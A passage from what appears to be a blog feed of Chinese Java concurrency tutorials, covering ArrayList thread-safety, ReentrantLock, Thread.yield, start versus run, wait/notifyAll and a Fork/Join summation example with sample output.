        <content type="html"><![CDATA[<p>工作一两年的应该都知道 ArrayList 是线程不安全的，要使用线程安全的就使用 Vector，这也是各种 Java 面试宝典里面所提及的，可能很多工作好几年的程序员都停留在这个知识面上。</p><p>先说说为什么 ArrayList 是线程不安全的吧，来看以下的代码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public class TestArrayList &#123;private static List&lt;Integer&gt; list &#x3D; new ArrayList&lt;&gt;();public static void main(String[] args) throws InterruptedException &#123;for (int i &#x3D; 0; i &lt; 10; i++) &#123;testList();list.clear();&#125;&#125;private static void testList() throws InterruptedException &#123;Runnable runnable &#x3D; () -&gt; &#123;for (int i &#x3D; 0; i &lt; 10000; i++) &#123;list.add(i);&#125;&#125;;Thread t1 &#x3D; new Thread(runnable);Thread t2 &#x3D; new Thread(runnable);Thread t3 &#x3D; new Thread(runnable);t1.start();t2.start();t3.start();t1.join();t2.join();t3.join();System.out.println(list.size());&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是它的输出结果，我们期望的结果应该都是：30000，然后并不是，这就是传说中的多线程并发问题了。</p><pre class="line-numbers language-none"><code class="language-none">Exception in thread &quot;Thread-1&quot; java.lang.ArrayIndexOutOfBoundsException: 15786at java.base&#x2F;java.util.ArrayList.add(ArrayList.java:468)at java.base&#x2F;java.util.ArrayList.add(ArrayList.java:480)at com.test.thread.TestArrayList.lambda$testList$0(TestArrayList.java:23)at java.base&#x2F;java.lang.Thread.run(Thread.java:844)20332161001494123749156312211827417300002869127843<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="现象分析"><a href="#现象分析" class="headerlink" title="现象分析"></a>现象分析</h4><p>从以上结果可以总结出 ArrayList 在并发情况下会出现的几种现象。</p><p><strong>1、发生 ArrayIndexOutOfBoundsException 异常；</strong></p><pre class="line-numbers language-none"><code class="language-none">private void add(E e, Object[] elementData, int s) &#123;    if (s &#x3D;&#x3D; elementData.length)        elementData &#x3D; grow();    elementData[s] &#x3D; e;    size &#x3D; s + 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定位到异常所在源代码，毫无疑问，问题是出现在多线程并发访问下，由于没有同步锁的保护，造成了 ArrayList 扩容不一致的问题。</p><p><strong>2、程序正常运行，输出了少于实际容量的大小；</strong></p><p>这个也是多线程并发赋值时，对同一个数组索引位置进行了赋值，所以出现少于预期大小的情况。</p><p><strong>3、程序正常运行，输出了预期容量的大小；</strong></p><p>这是正常运行结果，未发生多线程安全问题，但这是不确定性的，不是每次都会达到正常预期的。</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>既然这样，那么在高并发情况下，使用什么样的列表集合保护线程安全呢？回到文章最开始的地方，使用 Vector，还有别的吗？当然有，篇幅有限，请各位看官期待后续文章。</p><p>另外，像 HashMap, HashSet 等都有类似多线程安全问题，在多线程并发环境下避免使用这种集合。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>到底什么是重入锁，拜托，一次搞清楚！</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E9%87%8D%E5%85%A5%E9%94%81%EF%BC%8C%E6%8B%9C%E6%89%98%EF%BC%8C%E4%B8%80%E6%AC%A1%E6%90%9E%E6%B8%85%E6%A5%9A%EF%BC%81/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E9%87%8D%E5%85%A5%E9%94%81%EF%BC%8C%E6%8B%9C%E6%89%98%EF%BC%8C%E4%B8%80%E6%AC%A1%E6%90%9E%E6%B8%85%E6%A5%9A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是重入锁"><a href="#什么是重入锁" class="headerlink" title="什么是重入锁"></a>什么是重入锁</h4><blockquote><p>java.util.concurrent.locks.ReentrantLock</p></blockquote><p>这个是 JDK @since 1.5 添加的一种颗粒度更小的锁，它完全可以替代 synchronized 关键字来实现它的所有功能，而且 ReentrantLock 锁的灵活度要远远大于 synchronized 关键字。</p><p><img src="http://img.javastack.cn/ReentrantLock.png"></p><p>从类结构图看出，ReentrantLock 实现了 Lock 接口，ReentrantLock 只是 Lock 接口的一个实现而已。</p><blockquote><p>java.util.concurrent.locks.Lock</p></blockquote><p>它们都是 java.util.concurrent 包里面的内容（俗称 JUC、并发包），也都是 JDK 1.5 开始加入的。</p><h4 id="为什么叫重入锁呢？"><a href="#为什么叫重入锁呢？" class="headerlink" title="为什么叫重入锁呢？"></a>为什么叫重入锁呢？</h4><p>ReentrantLock，我们把它拆开来看就明了了。</p><p>Re-Entrant-Lock：即表示可重新反复进入的锁，但仅限于当前线程；</p><pre class="line-numbers language-none"><code class="language-none">public void m() &#123;    lock.lock();    lock.lock();    try &#123;      &#x2F;&#x2F; ... method body    &#125; finally &#123;      lock.unlock()      lock.unlock()    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如示例代码所示，当前线程可以反复加锁，但也需要释放同样加锁次数的锁，即重入了多少次，就要释放多少次，不然也会导入锁不被释放。</p><p>试想一下，如果不设计成可重入锁，那自己如果反复给自己加锁，不是会把自己加死锁了吗？所以，到现在，重入锁的概念大概应该清楚了吧？</p><h4 id="重入锁最重要的几个方法"><a href="#重入锁最重要的几个方法" class="headerlink" title="重入锁最重要的几个方法"></a>重入锁最重要的几个方法</h4><p>这几个方法都是 Lock 接口中定义的：</p><p><img src="http://img.javastack.cn/Lock.png"></p><p><strong>1）lock()</strong></p><p>获取锁，有以下三种情况：</p><ul><li>锁空闲：直接获取锁并返回，同时设置锁持有者数量为：1；</li><li>当前线程持有锁：直接获取锁并返回，同时锁持有者数量递增1；</li><li>其他线程持有锁：当前线程会休眠等待，直至获取锁为止；</li></ul><p><strong>2）lockInterruptibly()</strong></p><p>获取锁，逻辑和 lock() 方法一样，但这个方法在获取锁过程中能响应中断。</p><p><strong>3）tryLock()</strong></p><p>从关键字字面理解，这是在尝试获取锁，获取成功返回：true，获取失败返回：false, 这个方法不会等待，有以下三种情况：</p><ul><li>锁空闲：直接获取锁并返回：true，同时设置锁持有者数量为：1；</li><li>当前线程持有锁：直接获取锁并返回：true，同时锁持有者数量递增1；</li><li>其他线程持有锁：获取锁失败，返回：false；</li></ul><p><strong>4）tryLock(long timeout, TimeUnit unit)</strong></p><p>逻辑和 tryLock() 差不多，只是这个方法是带时间的。</p><p><strong>5）unlock()</strong></p><p>释放锁，每次锁持有者数量递减 1，直到 0 为止。所以，现在知道为什么 lock 多少次，就要对应 unlock 多少次了吧。</p><p><strong>6）newCondition</strong></p><p>返回一个这个锁的 Condition 实例，可以实现 synchronized 关键字类似 wait&#x2F; notify 实现多线程通信的功能，不过这个比 wait&#x2F; notify 要更灵活，更强大！</p><h4 id="重入锁大概的用法"><a href="#重入锁大概的用法" class="headerlink" title="重入锁大概的用法"></a>重入锁大概的用法</h4><pre class="line-numbers language-none"><code class="language-none">class X &#123;  private final ReentrantLock lock &#x3D; new ReentrantLock();    &#x2F;&#x2F; ...  public void m() &#123;    lock.lock();  &#x2F;&#x2F; block until condition holds    try &#123;      &#x2F;&#x2F; ... method body    &#125; finally &#123;      lock.unlock()    &#125;  &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看见没有，加锁和释放锁都在方法里面进行，可以自由控制，比 synchronized 更灵活，更方便。但要注意的是，释放锁操作必须在 finally 里面，不然如果出现异常导致锁不能被正常释放，进而会卡死后续所有访问该锁的线程。</p><h4 id="synchronized-是重入锁吗？"><a href="#synchronized-是重入锁吗？" class="headerlink" title="synchronized 是重入锁吗？"></a>synchronized 是重入锁吗？</h4><p>那么问题来了，synchronized 是重入锁吗？</p><p>你可能会说不是，因为 ReentrantLock 既然是重入锁，根据推理，相反，那 synchronized 肯定就不是重入锁，那你就错了。</p><p>答案是：yes，为什么？看下面的例子：</p><pre class="line-numbers language-none"><code class="language-none">public synchronized void operation()&#123;    add();&#125;public synchronized void add()&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>operation 方法调用了 add 方法，两个方法都是用 synchronized 修饰的，add()  方法可以成功获取当前线程 operation() 方法已经获取到的锁，说明 synchronized 就是可重入锁。</p><p>面试常问的Synchronized的几种用法推荐看下这篇文章：<a href="https://mp.weixin.qq.com/s/9h6VjHAmLA3twD6Y-FqfwA">Synchronized 有几种用法？</a>。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程 Thread.yield 方法到底有什么用？</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B%20Thread.yield%20%E6%96%B9%E6%B3%95%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B%20Thread.yield%20%E6%96%B9%E6%B3%95%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>我们知道 start() 方法是启动线程，让线程变成就绪状态等待 CPU 调度后执行。</p><p>那 yield() 方法是干什么用的呢？来看下源码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * A hint to the scheduler that the current thread is willing to yield * its current use of a processor. The scheduler is free to ignore this * hint. * * &lt;p&gt; Yield is a heuristic attempt to improve relative progression * between threads that would otherwise over-utilise a CPU. Its use * should be combined with detailed profiling and benchmarking to * ensure that it actually has the desired effect. * * &lt;p&gt; It is rarely appropriate to use this method. It may be useful * for debugging or testing purposes, where it may help to reproduce * bugs due to race conditions. It may also be useful when designing * concurrency control constructs such as the ones in the * &#123;@link java.util.concurrent.locks&#125; package. *&#x2F;public static native void yield();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>yield 即 “谦让”，也是 Thread 类的方法。它让掉当前线程 CPU 的时间片，使正在运行中的线程重新变成就绪状态，并重新竞争 CPU 的调度权。它可能会获取到，也有可能被其他线程获取到。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>下面是一个使用示例。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public static void main(String[] args) &#123;Runnable runnable &#x3D; () -&gt; &#123;for (int i &#x3D; 0; i &lt;&#x3D; 100; i++) &#123;System.out.println(Thread.currentThread().getName() + &quot;-----&quot; + i);if (i % 20 &#x3D;&#x3D; 0) &#123;Thread.yield();&#125;&#125;&#125;;new Thread(runnable, &quot;栈长&quot;).start();    new Thread(runnable, &quot;小蜜&quot;).start();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个示例每当执行完 20 个之后就让出 CPU，每次谦让后就会马上获取到调度权继续执行。</p><p><strong>运行以上程序，可以有以下两种结果。</strong></p><p>结果1：栈长让出了 CPU 资源，小蜜成功上位。</p><pre class="line-numbers language-none"><code class="language-none">栈长-----29栈长-----30小蜜-----26栈长-----31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>结果2：栈长让出了 CPU 资源，栈长继续运行。</p><pre class="line-numbers language-none"><code class="language-none">栈长-----28栈长-----29栈长-----30栈长-----31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而如果我们把两个线程加上线程优先级，那输出的结果又不一样。</p><pre class="line-numbers language-none"><code class="language-none">thread1.setPriority(Thread.MIN_PRIORITY);thread2.setPriority(Thread.MAX_PRIORITY);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为给小蜜加了最高优先权，栈长加了最低优先权，即使栈长先启动，那小蜜还是有很大的概率比栈长先会输出完的，大家可以试一下。</p><h2 id="yield-和-sleep-的异同"><a href="#yield-和-sleep-的异同" class="headerlink" title="yield 和 sleep 的异同"></a>yield 和 sleep 的异同</h2><p>1）yield, sleep 都能暂停当前线程，sleep 可以指定具体休眠的时间，而 yield 则依赖 CPU 的时间片划分。</p><p>2）yield, sleep 两个在暂停过程中，如已经持有锁，则都不会释放锁资源。</p><p>3）yield 不能被中断，而 sleep 则可以接受中断。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>栈长没用过 yield，感觉没什么鸟用。</p><p>如果一定要用它的话，一句话解释就是：yield 方法可以很好的控制多线程，如执行某项复杂的任务时，如果担心占用资源过多，可以在完成某个重要的工作后使用 yield 方法让掉当前 CPU 的调度权，等下次获取到再继续执行，这样不但能完成自己的重要工作，也能给其他线程一些运行的机会，避免一个线程长时间占有 CPU 资源。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程 start 和 run 方法到底有什么区别？</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B%20start%20%E5%92%8C%20run%20%E6%96%B9%E6%B3%95%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B%20start%20%E5%92%8C%20run%20%E6%96%B9%E6%B3%95%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>首先要知道实现多线程最基本的两种方式：</strong></p><p>1、继承 <code>java.lang.Thread</code> 类；</p><p>2、实现 <code>java.lang.Runnable</code>接口；</p><p>其中 Thread 类也是实现了 Runnable 接口，而 Runnable 接口定义了唯一的一个 run() 方法，所以基于 Thread 和 Runnable 创建多线程都需要实现 run() 方法，是多线程真正运行的主方法。</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface Runnable &#123;    public abstract void run();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而 start() 方法则是 Thread 类的方法，用来异步启动一个线程，然后主线程立刻返回。该启动的线程不会马上运行，会放到等待队列中等待 CPU 调度，只有线程真正被 CPU 调度时才会调用 run() 方法执行。</p><p>所以 start() 方法只是标识线程为就绪状态的一个附加方法，以下 start() 方法的源码，其中 start0() 是一个本地 native 方法。</p><pre class="line-numbers language-none"><code class="language-none">public synchronized void start() &#123;    if (threadStatus !&#x3D; 0)        throw new IllegalThreadStateException();    group.add(this);    boolean started &#x3D; false;    try &#123;        start0();        started &#x3D; true;    &#125; finally &#123;        try &#123;            if (!started) &#123;                group.threadStartFailed(this);            &#125;        &#125; catch (Throwable ignore) &#123;            &#x2F;* do nothing. If start0 threw a Throwable then              it will be passed up the call stack *&#x2F;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请注意，start() 方法被标识为 synchronized 的，即为了防止被多次启动的一个同步操作。</p><p><strong>那么你会问了，为什么要有两个方法，直接用一个 run() 方法不就行了吗！？</strong> 还真不行，如果直接调用 run() 方法，那就等于调用了一个普通的同步方法，达不到多线程运行的异步执行，来看下面的例子。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public static void main(String[] args) &#123;Thread thread &#x3D; new Thread(() -&gt; &#123;try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;System.out.println(&quot;Java技术&quot;);&#125;);long start &#x3D; System.currentTimeMillis();thread.start();System.out.println(System.currentTimeMillis() - start);start &#x3D; System.currentTimeMillis();thread.run();System.out.println(System.currentTimeMillis() - start);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">0Java技术3000Java技术<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>从程序输出结果可以看出，启动 start 方法前后只用了 0 毫秒，而启动 run 方法则阻塞了 3000 毫秒等程序执行完再继续执行，这就是同步与异步的一个最重要的区别。</p><p>看完这篇，你应该对 start 和 run 方法有了一个大概的掌握吧，再也不怕面试官问你这两个的区别了吧！</p><p>动手转发给更多的朋友吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程通信的三大法器，你真的会用吗？</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%E7%9A%84%E4%B8%89%E5%A4%A7%E6%B3%95%E5%99%A8%EF%BC%8C%E4%BD%A0%E7%9C%9F%E7%9A%84%E4%BC%9A%E7%94%A8%E5%90%97%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%E7%9A%84%E4%B8%89%E5%A4%A7%E6%B3%95%E5%99%A8%EF%BC%8C%E4%BD%A0%E7%9C%9F%E7%9A%84%E4%BC%9A%E7%94%A8%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>wait, notify, notifyAll 是多线程之间通信最重要的 3 个方法，今天，栈长给大家普及一下它们的知识要点及应用实战。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>wait：让持有该对象锁的线程等待；</p><p>notify: 唤醒任何一个持有该对象锁的线程；</p><p>notify: 唤醒所有持有该对象锁的线程；</p><p>它们 3 个的关系是，调用对象的 wait 方法使线程暂停运行，通过 notify&#x2F; notifyAll 方法唤醒调用 wait 暂时的线程。</p><p><strong>然而，它们并不是 Thread 类中的方法，而是 Object 类中的，为什么呢！？</strong> 因为每个对象都有监视锁，线程要操作某个对象当然是要获取某个对象的锁了，而不是线程的锁。</p><p><img src="http://qianniu.javastack.cn/18-6-1/82637503.jpg"></p><p>如图所示，wait 带时间表示最大超时时间，过了时间还不唤醒就会自动唤醒线程重新竞争对象锁。</p><h2 id="几个重要的点"><a href="#几个重要的点" class="headerlink" title="几个重要的点"></a>几个重要的点</h2><p>1、调用对象的 wait, notify, notifyAll 方法需要拥有对象的监视器锁，即它们只能在同步方法（块）中使用；</p><p>2、调用 wait 方法会使用线程暂停并让出 CPU 资源，同时释放持有的对象的锁；</p><p>3、多线程使用 notify 容易发生死锁，一般使用 notifyAll；</p><p>4、关于 wait 和 sleep 的详细区别请翻阅 《<a href="https://mp.weixin.qq.com/s/gvaksKy2ss90bsybCnajpQ">多线程 sleep 和 wait 的 5 个区别</a>》这篇文章。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public static void main(String[] args) &#123;Object lock &#x3D; new Object();Thread t1 &#x3D; new Thread(() -&gt; &#123;synchronized (lock) &#123;for (int i &#x3D; 0; i &lt; 20; i++) &#123;System.out.print(i);if (i &#x3D;&#x3D; 10) &#123;try &#123;lock.wait();&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;&#125;&#125;&#125;);Thread t2 &#x3D; new Thread(() -&gt; &#123;synchronized (lock) &#123;try &#123;Thread.sleep(5000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;System.out.print(&quot;Java技术&quot;);lock.notifyAll();&#125;&#125;);t1.start();t2.start();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的例子结合 wait&#x2F; notifyAll 来演示了它们的相互作用。</p><p>线程 t1 首先输出 <code>012345678910</code>，5秒后继续输出 <code>Java技术111213141516171819</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并行任务执行神器 Fork &amp; Join 实战</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%B9%B6%E8%A1%8C%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E7%A5%9E%E5%99%A8%20Fork%20&amp;%20Join%20%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%B9%B6%E8%A1%8C%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E7%A5%9E%E5%99%A8%20Fork%20&amp;%20Join%20%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h4 id="Fork-Join是什么？"><a href="#Fork-Join是什么？" class="headerlink" title="Fork&#x2F;Join是什么？"></a>Fork&#x2F;Join是什么？</h4><p>Fork&#x2F;Join框架是Java7提供的并行执行任务框架，思想是将大任务分解成小任务，然后小任务又可以继续分解，然后每个小任务分别计算出结果再合并起来，最后将汇总的结果作为大任务结果。其思想和MapReduce的思想非常类似。对于任务的分割，要求各个子任务之间相互独立，能够并行独立地执行任务，互相之间不影响。</p><p><strong>Fork&#x2F;Join的运行流程图如下：</strong></p><p><img src="https://res.infoq.com/articles/fork-join-introduction/zh/resources/21.png" alt="image"></p><p>我们可以通过Fork&#x2F;Join单词字面上的意思去理解这个框架。Fork是叉子分叉的意思，即将大任务分解成并行的小任务，Join是连接结合的意思，即将所有并行的小任务的执行结果汇总起来。</p><p><img src="http://java.boot.by/ocpjp7-upgrade/images/040501.gif" alt="image"></p><h4 id="工作窃取算法"><a href="#工作窃取算法" class="headerlink" title="工作窃取算法"></a>工作窃取算法</h4><p>ForkJoin采用了工作窃取（work-stealing）算法，若一个工作线程的任务队列为空没有任务执行时，便从其他工作线程中获取任务主动执行。为了实现工作窃取，在工作线程中维护了双端队列，窃取任务线程从队尾获取任务，被窃取任务线程从队头获取任务。这种机制充分利用线程进行并行计算，减少了线程竞争。但是当队列中只存在一个任务了时，两个线程去取反而会造成资源浪费。</p><p><strong>工作窃取的运行流程图如下：</strong></p><p><img src="https://res.infoq.com/articles/fork-join-introduction/zh/resources/image3.png" alt="image"></p><h4 id="Fork-Join核心类"><a href="#Fork-Join核心类" class="headerlink" title="Fork&#x2F;Join核心类"></a>Fork&#x2F;Join核心类</h4><p>Fork&#x2F;Join框架主要由子任务、任务调度两部分组成，类层次图如下。</p><p><img src="http://img.blog.csdn.net/20160720172854109" alt="image"></p><ul><li><strong>ForkJoinPool</strong></li></ul><p>ForkJoinPool是ForkJoin框架中的任务调度器，和ThreadPoolExecutor一样实现了自己的线程池，提供了三种调度子任务的方法：</p><ol><li>execute：异步执行指定任务，无返回结果；</li><li>invoke、invokeAll：异步执行指定任务，等待完成才返回结果；</li><li>submit：异步执行指定任务，并立即返回一个Future对象；</li></ol><ul><li><strong>ForkJoinTask</strong></li></ul><p>Fork&#x2F;Join框架中的实际的执行任务类，有以下两种实现，一般继承这两种实现类即可。</p><ol><li>RecursiveAction：用于无结果返回的子任务；</li><li>RecursiveTask：用于有结果返回的子任务；</li></ol><h4 id="Fork-Join框架实战"><a href="#Fork-Join框架实战" class="headerlink" title="Fork&#x2F;Join框架实战"></a>Fork&#x2F;Join框架实战</h4><p>下面实现一个Fork&#x2F;Join小例子，从1+2+…10亿，每个任务只能处理1000个数相加，超过1000个的自动分解成小任务并行处理；并展示了通过不使用Fork&#x2F;Join和使用时的时间损耗对比。</p><pre class="line-numbers language-none"><code class="language-none">import java.util.concurrent.ForkJoinPool;import java.util.concurrent.RecursiveTask;public class ForkJoinTask extends RecursiveTask&lt;Long&gt; &#123;private static final long MAX &#x3D; 1000000000L;private static final long THRESHOLD &#x3D; 1000L;private long start;private long end;public ForkJoinTask(long start, long end) &#123;this.start &#x3D; start;this.end &#x3D; end;&#125;public static void main(String[] args) &#123;test();System.out.println(&quot;--------------------&quot;);testForkJoin();&#125;private static void test() &#123;System.out.println(&quot;test&quot;);long start &#x3D; System.currentTimeMillis();Long sum &#x3D; 0L;for (long i &#x3D; 0L; i &lt;&#x3D; MAX; i++) &#123;sum +&#x3D; i;&#125;System.out.println(sum);System.out.println(System.currentTimeMillis() - start + &quot;ms&quot;);&#125;private static void testForkJoin() &#123;System.out.println(&quot;testForkJoin&quot;);long start &#x3D; System.currentTimeMillis();ForkJoinPool forkJoinPool &#x3D; new ForkJoinPool();Long sum &#x3D; forkJoinPool.invoke(new ForkJoinTask(1, MAX));System.out.println(sum);System.out.println(System.currentTimeMillis() - start + &quot;ms&quot;);&#125;@Overrideprotected Long compute() &#123;long sum &#x3D; 0;if (end - start &lt;&#x3D; THRESHOLD) &#123;for (long i &#x3D; start; i &lt;&#x3D; end; i++) &#123;sum +&#x3D; i;&#125;return sum;&#125; else &#123;long mid &#x3D; (start + end) &#x2F; 2;ForkJoinTask task1 &#x3D; new ForkJoinTask(start, mid);task1.fork();ForkJoinTask task2 &#x3D; new ForkJoinTask(mid + 1, end);task2.fork();return task1.join() + task2.join();&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要计算结果，所以任务继承的是RecursiveTask类。ForkJoinTask需要实现compute方法，在这个方法里首先需要判断任务是否小于等于阈值1000，如果是就直接执行任务。否则分割成两个子任务，每个子任务在调用fork方法时，又会进入compute方法，看看当前子任务是否需要继续分割成孙任务，如果不需要继续分割，则执行当前子任务并返回结果。使用join方法会阻塞并等待子任务执行完并得到其结果。</p><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">test5000000005000000004992ms--------------------testForkJoin500000000500000000508ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从结果看出，并行的时间损耗明显要少于串行的，这就是并行任务的好处。</p><p>尽管如此，在使用Fork&#x2F;Join时也得注意，不要盲目使用。</p><ol><li>如果任务拆解的很深，系统内的线程数量堆积，导致系统性能性能严重下降；</li><li>如果函数的调用栈很深，会导致栈内存溢出；</li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你如何监控 Java 线程池运行状态</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7%20Java%20%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7%20Java%20%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81/</url>
      
